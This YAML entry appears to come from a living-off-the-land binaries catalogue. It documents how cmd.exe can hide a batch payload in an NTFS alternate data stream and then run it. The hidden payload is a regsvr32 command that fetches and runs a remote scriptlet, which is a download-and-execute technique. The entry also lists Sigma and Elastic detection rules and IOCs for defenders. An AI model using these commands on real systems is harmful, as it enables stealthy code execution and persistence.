---
Name: Cmd.exe
Description: The command-line interpreter in Windows
Author: 'Ye Yint Min Thu Htut'
Created: 2019-06-26
Commands:
  - Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
    Description: Add content to an Alternate Data Stream (ADS).
    Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
    Category: ADS
    Privileges: User
    MitreID: T1059.003
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: cmd.exe - < fakefile.doc:payload.bat
    Description: Execute payload.bat stored in an Alternate Data Stream (ADS).
    Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
    Category: ADS
    Privileges: User
    MitreID: T1059.003
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\cmd.exe
  - Path: C:\Windows\SysWOW64\cmd.exe
Code_Sample:
- Code:
Detection:
 - Sigma: https://github.com/SigmaHQ/sigma/blob/688df3405afd778d63a2ea36a084344a2052848c/rules/windows/process_creation/process_creation_alternate_data_streams.yml
 - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml
 - Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml
 - IOC: cmd.exe executing files from alternate data streams.
 - IOC: cmd.exe creating/modifying file contents in an alternate data stream.
Resources:
  - Link: https://twitter.com/yeyint_mth/status/1143824979139579904
Acknowledgement:
  - Person: r0lan
    Handle: '@yeyint_mth'
---
